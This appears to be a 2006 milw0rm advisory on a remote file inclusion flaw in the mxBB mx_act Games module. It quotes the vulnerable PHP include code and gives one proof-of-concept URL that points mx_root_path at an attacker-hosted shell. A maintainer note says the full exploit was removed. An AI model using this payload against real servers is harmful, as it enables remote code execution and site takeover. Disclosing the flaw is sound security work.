# mx_act (mxBB Games Module)   --Remote File Inclusion Exploit
# Bug Found & Exploit [c]oded By Dr Max Virus
# Download:http://www.mx-system.com/index.php?page=4&action=file&file_id=71

Problem area:

	if ( !file_exists($mx_root_path . 'modules/mx_act/language/lang_' . $board_config['default_lang'] . '/lang_activity.'.$phpEx ) )
	{
	  	include( $mx_root_path . 'modules/mx_act/language/lang_english/lang_activity.'.$phpEx );
		$link_language='lang_english';
	}	
	else
	{
	  	include(  $mx_root_path . 'modules/mx_act/language/lang_' . $board_config['default_lang'] . '/lang_activity.'.$phpEx );
		$link_language='lang_' . $board_config['default_lang'];
	} 

PoC:
	
	http://site.com/mxBB/modules/mx_act/include/constants/act_constants.php?mx_root_path=http://[yourshell]?&	
	

# exploit was broken and removed. /str0ke

# milw0rm.com [2006-12-11]
